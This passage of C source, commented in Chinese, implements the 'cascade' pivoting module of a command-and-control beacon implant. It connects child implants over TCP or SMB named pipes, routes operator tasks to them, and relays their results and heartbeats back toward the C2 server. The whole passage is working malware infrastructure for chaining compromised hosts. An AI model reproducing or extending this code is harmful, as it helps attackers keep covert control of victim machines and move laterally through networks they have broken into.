        CascadeChannel* next = list->next;
        list->next = NULL;
        CascadeFreeChannel(list);
        list = next;
    }
}

/* 清理已完成的通道：加锁分离后在锁外释放 */
static VOID CascadeCleanupFinished(CascadeManager* cm)
{
    CascadeChannel* list;

    if (!cm) return;

    EnterCriticalSection(&cm->lock);
    list = CascadeDetachFinishedLocked(cm);
    LeaveCriticalSection(&cm->lock);

    CascadeFreeChannelList(list);
}

/* 释放级联管理器：关闭所有通道和待处理队列，销毁临界区 */
VOID CascadeFree(CascadeManager* cm)
{
    CascadeChannel* ch;
    CascadePending* p;

    if (!cm) return;

    EnterCriticalSection(&cm->lock);
    ch = cm->channels;
    cm->channels = NULL;
    p = cm->pending_head;
    cm->pending_head = NULL;
    cm->pending_tail = NULL;
    cm->pending_count = 0;
    LeaveCriticalSection(&cm->lock);

    while (ch) {
        CascadeChannel* next = ch->next;
        CascadeFreeChannel(ch);
        ch = next;
    }

    EnterCriticalSection(&cm->lock);
    if (cm->pending_head) {
        if (!p) {
            p = cm->pending_head;
        } else {
            CascadePending* tail = p;
            while (tail->next) tail = tail->next;
            tail->next = cm->pending_head;
        }
        cm->pending_head = NULL;
        cm->pending_tail = NULL;
        cm->pending_count = 0;
    }
    LeaveCriticalSection(&cm->lock);

    while (p) {
        CascadePending* next = p->next;
        BbFree(&p->packet);
        HeapFree(GetProcessHeap(), 0, p);
        p = next;
    }

    DeleteCriticalSection(&cm->lock);
    ZeroMemory(cm, sizeof(*cm));
}

/* 入队一个 FINAL 数据包到待处理队列尾部，并唤醒主循环 */
static VOID CascadeQueueFinal(CascadeManager* cm, UINT32 command_id, const ByteBuf* payload)
{
    CascadePending* p;
    ByteBuf final;

    if (!cm || !payload) return;

    final = PacketMakeFinal(0, command_id, payload);
    p = (CascadePending*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*p));
    if (!p) {
        BbFree(&final);
        return;
    }
    p->packet = final;

    EnterCriticalSection(&cm->lock);
    if (cm->pending_tail) {
        cm->pending_tail->next = p;
    } else {
        cm->pending_head = p;
    }
    cm->pending_tail = p;
    ++cm->pending_count;
    LeaveCriticalSection(&cm->lock);

    CascadeWake(cm->ctx);
}

/* 入队 CASCADE_OPEN 消息：通知上层有新的子通道连接 */
static VOID CascadeQueueOpen(CascadeManager* cm, const CHAR* child_id, const CHAR* protocol,
                             const CHAR* hint, const ByteBuf* hello)
{
    ByteBuf p;
    ByteBuf hb;

    BbInit(&p);
    hb = PacketPackBytes(hello);
    PacketArrayString(&p, child_id);
    PacketArrayString(&p, protocol);
    PacketArrayString(&p, hint);
    PacketArrayBytes(&p, hb.data, hb.len);
    BbFree(&hb);
    CascadeQueueFinal(cm, BEACON_COMMAND_CASCADE_OPEN, &p);
    BbFree(&p);
}

/* 入队 CASCADE_READ 消息：将子通道收到的数据转发给上层 */
static VOID CascadeQueueRead(CascadeManager* cm, const CHAR* child_id, const ByteBuf* data)
{
    ByteBuf p;
    ByteBuf packed;

    BbInit(&p);
    packed = PacketPackBytes(data);
    PacketArrayString(&p, child_id);
    PacketArrayBytes(&p, packed.data, packed.len);
    BbFree(&packed);
    CascadeQueueFinal(cm, BEACON_COMMAND_CASCADE_READ, &p);
    BbFree(&p);
}

/* 入队 CASCADE_DEAD 消息：通知上层子通道已断开 */
static VOID CascadeQueueDead(CascadeManager* cm, const CHAR* child_id, const CHAR* reason)
{
    ByteBuf p;

    BbInit(&p);
    PacketArrayString(&p, child_id);
    PacketArrayString(&p, reason ? reason : "");
    CascadeQueueFinal(cm, BEACON_COMMAND_CASCADE_DEAD, &p);
    BbFree(&p);
}

/* 入队 CASCADE_PING 消息：转发子通道心跳数据 */
static VOID CascadeQueuePing(CascadeManager* cm, const CHAR* child_id, const ByteBuf* data)
{
    ByteBuf p;
    ByteBuf packed;

    BbInit(&p);
    packed = PacketPackBytes(data);
    PacketArrayString(&p, child_id);
    PacketArrayBytes(&p, packed.data, packed.len);
    BbFree(&packed);
    CascadeQueueFinal(cm, BEACON_COMMAND_CASCADE_PING, &p);
    BbFree(&p);
}

/*
 * 启动一次异步管道读。
 * 返回 0 表示失败，1 表示 I/O 挂起，2 表示立即完成。
 */
static INT CascadeStartPipeRead(CascadeIo* io, DWORD* immediate_read)
{
    DWORD read_bytes;

    if (immediate_read) *immediate_read = 0;
    if (!io || io->kind != CASCADE_IO_PIPE || io->pipe == INVALID_HANDLE_VALUE) return 0;
    if (!io->read_event) return 0;
    ResetEvent(io->read_event);
    ZeroMemory(&io->read_olap, sizeof(io->read_olap));
    io->read_olap.hEvent = io->read_event;
    if (!ReadFile(io->pipe, io->read_buf, sizeof(io->read_buf), &read_bytes, &io->read_olap)) {
        if (GetLastError() == ERROR_IO_PENDING) {
            io->read_pending = TRUE;
            return 1;
        }
        return 0;
    }
    if (read_bytes == 0) return 0;
    io->read_pending = FALSE;
    if (immediate_read) *immediate_read = read_bytes;
    return 2;
}

/*
 * 帧分发：将原始数据喂入帧解析器，按命令类型入队。
 * RESULT → CascadeQueueRead，PING → CascadeQueuePing，CLOSE → 断开通道。
 */
static INT CascadeFeedChannelFrames(CascadeManager* cm, CascadeChannel* ch,
                                     const BYTE8* data, SIZE_T len)
{
    SIZE_T off = 0;

    while (off < len) {
        UINT16 cmd = 0;
        ByteBuf body;
        INT consumed;

        BbInit(&body);
        consumed = CascadeFrameReaderFeed(&ch->frame_reader, data + off, len - off, &cmd, &body);
        if (consumed < 0) return -1;
        if (consumed == 0) break;
        off += (SIZE_T)consumed;
        if (cmd == 0) continue;

        if (cmd == CASCADE_FRAME_RESULT) {
            CascadeQueueRead(cm, ch->child_id, &body);
        } else if (cmd == CASCADE_FRAME_PING) {
            CascadeQueuePing(cm, ch->child_id, &body);
        } else if (cmd == CASCADE_FRAME_CLOSE) {
            BbFree(&body);
            return -1;
        } else {
            BbFree(&body);
        }
    }
    return 0;
}

/*
 * 单通道事件驱动泵：检查 TCP/Pipe 事件并处理收到的数据。
 * TCP 使用 WSA 事件，Pipe 使用 overlapped I/O 完成通知。
 */
static VOID CascadePumpChannel(CascadeManager* cm, CascadeChannel* ch)
{
    CascadeIo* io = &ch->io;

    if (io->kind == CASCADE_IO_TCP) {
        WSANETWORKEVENTS net_events;

        if (WaitForSingleObject(CascadeIoEvent(io), 0) != WAIT_OBJECT_0) return;

        ZeroMemory(&net_events, sizeof(net_events));
        if (WSAEnumNetworkEvents(io->sock, io->event, &net_events) == SOCKET_ERROR) {
            InterlockedExchange((LONG*)&ch->active, 0);
            CascadeQueueDead(cm, ch->child_id, "tcp event error");
            return;
        }
        if (net_events.lNetworkEvents & FD_READ) {
            BYTE8 buf[8192];
            INT n;

            for (;;) {
                n = recv(io->sock, (CHAR*)buf, sizeof(buf), 0);
                if (n > 0) {
                    if (CascadeFeedChannelFrames(cm, ch, buf, (SIZE_T)n) < 0) {
                        InterlockedExchange((LONG*)&ch->active, 0);
                        CascadeQueueDead(cm, ch->child_id, "frame error");
                        return;
                    }
                } else if (n == 0) {
                    InterlockedExchange((LONG*)&ch->active, 0);
                    CascadeQueueDead(cm, ch->child_id, "tcp closed");
                    return;
                } else {
                    if (WSAGetLastError() == WSAEWOULDBLOCK) break;
                    InterlockedExchange((LONG*)&ch->active, 0);
                    CascadeQueueDead(cm, ch->child_id, "tcp recv error");
                    return;
                }
            }
        }
        if (net_events.lNetworkEvents & FD_CLOSE) {
            InterlockedExchange((LONG*)&ch->active, 0);
            CascadeQueueDead(cm, ch->child_id, "tcp closed");
            return;
        }
    } else if (io->kind == CASCADE_IO_PIPE) {
        DWORD read_bytes;
        INT rc;

        if (io->read_pending) {
            if (!GetOverlappedResult(io->pipe, &io->read_olap, &read_bytes, FALSE)) {
                if (GetLastError() == ERROR_IO_INCOMPLETE) return;
                InterlockedExchange((LONG*)&ch->active, 0);
                CascadeQueueDead(cm, ch->child_id, "pipe read error");
                return;
            }
            io->read_pending = FALSE;
            if (read_bytes == 0) {
                InterlockedExchange((LONG*)&ch->active, 0);
                CascadeQueueDead(cm, ch->child_id, "pipe closed");
                return;
            }
            if (CascadeFeedChannelFrames(cm, ch, io->read_buf, read_bytes) < 0) {
                InterlockedExchange((LONG*)&ch->active, 0);
                CascadeQueueDead(cm, ch->child_id, "frame error");
                return;
            }
        }

        for (;;) {
            rc = CascadeStartPipeRead(io, &read_bytes);
            if (rc == 0) {
                InterlockedExchange((LONG*)&ch->active, 0);
                CascadeQueueDead(cm, ch->child_id, "pipe read start failed");
                return;
            }
            if (rc == 1) break;
            if (read_bytes == 0) {
                InterlockedExchange((LONG*)&ch->active, 0);
                CascadeQueueDead(cm, ch->child_id, "pipe closed");
                return;
            }
            if (CascadeFeedChannelFrames(cm, ch, io->read_buf, read_bytes) < 0) {
                InterlockedExchange((LONG*)&ch->active, 0);
                CascadeQueueDead(cm, ch->child_id, "frame error");
                return;
            }
        }
    }
}

/*
 * 轮询级联管理器：泵送所有活跃通道，收集待处理队列。
 * 返回待发送给 C2 的数据包列表。
 */
PacketList CascadePoll(CascadeManager* cm)
{
    PacketList out;
    CascadePending* p;
    CascadeChannel* ch;

    PlistInit(&out);
    out.items_are_final = 1;
    if (!cm) return out;

    EnterCriticalSection(&cm->lock);
    for (ch = cm->channels; ch; ch = ch->next) {
        if (ch->active) {
            CascadePumpChannel(cm, ch);
        }
    }
    LeaveCriticalSection(&cm->lock);

    EnterCriticalSection(&cm->lock);
    p = cm->pending_head;
    cm->pending_head = NULL;
    cm->pending_tail = NULL;
    cm->pending_count = 0;
    LeaveCriticalSection(&cm->lock);

    while (p) {
        CascadePending* next = p->next;
        ByteBuf moved = p->packet;
        BbInit(&p->packet);
        PlistAdd(&out, moved);
        HeapFree(GetProcessHeap(), 0, p);
        p = next;
    }
    CascadeCleanupFinished(cm);
    return out;
}

/* 按 child_id 查找活跃通道，需持锁调用 */
static CascadeChannel* CascadeFindLocked(CascadeManager* cm, const CHAR* child_id)
{
    CascadeChannel* ch;

    for (ch = cm->channels; ch; ch = ch->next) {
        if (ch->active && strcmp(ch->child_id, child_id ? child_id : "") == 0) {
            return ch;
        }
    }
    return NULL;
}

/*
 * 注册新子通道：读取 HELLO 帧、创建通道结构、设置事件驱动 I/O。
 * 若已存在同名旧通道则替换之。返回操作结果文本。
 */
static ByteBuf CascadeRegisterChannel(BeaconContext* ctx, const CHAR* child_id, UINT32 protocol,
                                      const CHAR* hint, CascadeIo* io)
{
    CascadeChannel* ch;
    ByteBuf hello_body;
    ByteBuf heartbeat;
    Parser hello_parser;
    CHAR* real_child_id;
    UINT16 cmd = 0;
    DWORD immediate_read = 0;

    if (!CascadeIoReadFrame(io, &cmd, &hello_body) || cmd != CASCADE_FRAME_HELLO) {
        CascadeIoClose(io);
        return BbFromText("cascade child did not send HELLO");
    }

    ParserInit(&hello_parser, hello_body.data, hello_body.len);
    real_child_id = ParserString(&hello_parser);
    heartbeat = ParserBytes(&hello_parser);
    if (hello_parser.error[0]) {
        HeapFree(GetProcessHeap(), 0, real_child_id);
        BbFree(&hello_body);
        CascadeIoClose(io);
        return BbFromText("cascade child HELLO parse failed");
    }

    ch = (CascadeChannel*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*ch));
    if (!ch) {
        HeapFree(GetProcessHeap(), 0, real_child_id);
        BbFree(&hello_body);
        BbFree(&heartbeat);
        CascadeIoClose(io);
        return BbFromText("cascade channel allocation failed");
    }

    strncpy_s(ch->child_id, sizeof(ch->child_id),
              real_child_id && real_child_id[0] ? real_child_id : (child_id ? child_id : ""),
              _TRUNCATE);
    strncpy_s(ch->hint, sizeof(ch->hint), hint ? hint : "", _TRUNCATE);
    ch->protocol = protocol;
    CascadeIoInit(&ch->io);
    ch->io.kind = io->kind;
    ch->io.sock = io->sock;
    ch->io.pipe = io->pipe;
    io->kind = CASCADE_IO_NONE;
    io->sock = INVALID_SOCKET;
    io->pipe = INVALID_HANDLE_VALUE;
    CascadeIoClose(io);
    ch->active = 1;
    ch->ctx = ctx;
    CascadeFrameReaderInit(&ch->frame_reader);

    if (ch->io.kind == CASCADE_IO_TCP) {
        if (!CascadeIoEnableTcpReadEvent(&ch->io)) {
            BbFree(&hello_body);
            BbFree(&heartbeat);
            HeapFree(GetProcessHeap(), 0, real_child_id);
            CascadeFreeChannel(ch);
            return BbFromText("cascade tcp event setup failed");
        }
    } else if (ch->io.kind == CASCADE_IO_PIPE) {
        INT prc;
        if (!CascadeIoEnablePipeReadEvent(&ch->io)) {
            BbFree(&hello_body);
            BbFree(&heartbeat);
            HeapFree(GetProcessHeap(), 0, real_child_id);
            CascadeFreeChannel(ch);
            return BbFromText("cascade pipe event setup failed");
        }
        prc = CascadeStartPipeRead(&ch->io, &immediate_read);
        if (prc == 0) {
            BbFree(&hello_body);
            BbFree(&heartbeat);
            HeapFree(GetProcessHeap(), 0, real_child_id);
            CascadeFreeChannel(ch);
            return BbFromText("cascade pipe read start failed");
        }
    }

    EnterCriticalSection(&ctx->cascade.lock);
    {
        CascadeChannel* old = CascadeFindLocked(&ctx->cascade, ch->child_id);
        if (old) {
            old->active = 0;
            CascadeIoClose(&old->io);
        }
        ch->next = ctx->cascade.channels;
        ctx->cascade.channels = ch;
    }
    LeaveCriticalSection(&ctx->cascade.lock);

    CascadeQueueOpen(&ctx->cascade, ch->child_id,
                     protocol == CASCADE_PROTOCOL_TCP ? "tcp" : "smb",
                     ch->hint, &heartbeat);
    if (immediate_read > 0 &&
        CascadeFeedChannelFrames(&ctx->cascade, ch, ch->io.read_buf, immediate_read) < 0) {
        InterlockedExchange((LONG*)&ch->active, 0);
        CascadeQueueDead(&ctx->cascade, ch->child_id, "frame error");
    }
    BbFree(&hello_body);
    BbFree(&heartbeat);

    HeapFree(GetProcessHeap(), 0, real_child_id);
    return BbFromText("cascade child connected");
}

/* ===== 命令处理函数 ===== */

/* 处理 TCP 连接命令：解析参数后主动连接子通道 */
ByteBuf CascadeHandleConnectTcp(BeaconContext* ctx, Parser* parser)
{
    UINT32 argc;
    CHAR* child_id = NULL;
    CHAR* host = NULL;
    UINT32 port;
    CascadeIo io;
    CHAR hint[256];
    ByteBuf result;

    BbInit(&result);

    if (!ctx || !parser) return BbFromText("invalid cascade tcp request");
    argc = ParserU32(parser);
    if (argc < 3) return BbFromText("connect requires child_id, host and port");

    child_id = ParserString(parser);
    host = ParserString(parser);
    port = ParserU32(parser);
    if (parser->error[0]) {
        result = BbFromText(parser->error);
        goto cleanup;
    }

    if (!CascadeIoConnectTcp(host, (INT)port, ctx->profile.tcp_internal.connect_timeout_ms, &io)) {
        result = BbFromText("tcp child connect failed");
        goto cleanup;
    }

    snprintf(hint, sizeof(hint), "%s:%lu", host, (ULONG)port);
    result = CascadeRegisterChannel(ctx, child_id, CASCADE_PROTOCOL_TCP, hint, &io);

cleanup:
    HeapFree(GetProcessHeap(), 0, child_id);
    HeapFree(GetProcessHeap(), 0, host);
    return result;
}

/* 处理 SMB 链接命令：解析参数后通过命名管道连接子通道 */
ByteBuf CascadeHandleLinkSmb(BeaconContext* ctx, Parser* parser)
{
    UINT32 argc;
    CHAR* child_id = NULL;
    CHAR* pipe = NULL;
    CascadeIo io;
    ByteBuf result;

    BbInit(&result);

    if (!ctx || !parser) return BbFromText("invalid cascade smb request");
    argc = ParserU32(parser);
    if (argc < 2) return BbFromText("link requires child_id and pipe path");

    child_id = ParserString(parser);
    pipe = ParserString(parser);
    if (parser->error[0]) {
        result = BbFromText(parser->error);
        goto cleanup;
    }

    if (!CascadeIoConnectPipe(pipe, ctx->profile.smb_internal.connect_timeout_ms, &io)) {
        result = BbFromText("smb child link failed");
        goto cleanup;
    }

    result = CascadeRegisterChannel(ctx, child_id, CASCADE_PROTOCOL_SMB, pipe, &io);

cleanup:
    HeapFree(GetProcessHeap(), 0, child_id);
    HeapFree(GetProcessHeap(), 0, pipe);
    return result;
}

/* 处理路由命令：将数据帧转发给指定子通道 */
ByteBuf CascadeHandleRoute(BeaconContext* ctx, Parser* parser)
{
    CHAR* child_id = NULL;
    ByteBuf blob;
    CascadeChannel* ch;
    BOOL ok;
    ByteBuf result;

    BbInit(&result);

    if (!ctx || !parser) return BbFromText("invalid cascade route request");

    child_id = ParserString(parser);
    blob = ParserBytes(parser);
    if (parser->error[0]) {
        BbFree(&blob);
        result = BbFromText(parser->error);
        goto cleanup;
    }

    EnterCriticalSection(&ctx->cascade.lock);
    ch = CascadeFindLocked(&ctx->cascade, child_id);
    LeaveCriticalSection(&ctx->cascade.lock);

    if (!ch) {
        BbFree(&blob);
        result = BbFromText("cascade child not found");
        goto cleanup;
    }

    ok = CascadeIoWriteFrame(&ch->io, CASCADE_FRAME_TASK, &blob);
    BbFree(&blob);
    if (!ok) {
        InterlockedExchange((LONG*)&ch->active, 0);
        CascadeQueueDead(&ctx->cascade, child_id, "route write failed");
        result = BbFromText("cascade route write failed");
        goto cleanup;
    }

    result = BbFromText("cascade route sent");

cleanup:
    HeapFree(GetProcessHeap(), 0, child_id);
    return result;
}

/* 处理关闭命令：发送 CLOSE 帧并断开指定子通道 */
ByteBuf CascadeHandleClose(BeaconContext* ctx, Parser* parser)
{
    CHAR* child_id = NULL;
    CascadeChannel* ch;
    ByteBuf empty;
    ByteBuf result;

    BbInit(&result);

    if (!ctx || !parser) return BbFromText("invalid cascade close request");
    child_id = ParserString(parser);
    if (parser->error[0]) {
        result = BbFromText(parser->error);
        goto cleanup;
    }

    EnterCriticalSection(&ctx->cascade.lock);
    ch = CascadeFindLocked(&ctx->cascade, child_id);
    LeaveCriticalSection(&ctx->cascade.lock);

    if (!ch) {
        result = BbFromText("cascade child not found");
        goto cleanup;
    }

    BbInit(&empty);
    CascadeIoWriteFrame(&ch->io, CASCADE_FRAME_CLOSE, &empty);
    InterlockedExchange((LONG*)&ch->active, 0);
    CascadeIoClose(&ch->io);
    result = BbFromText("cascade child closed");

cleanup:
    HeapFree(GetProcessHeap(), 0, child_id);
    return result;
}
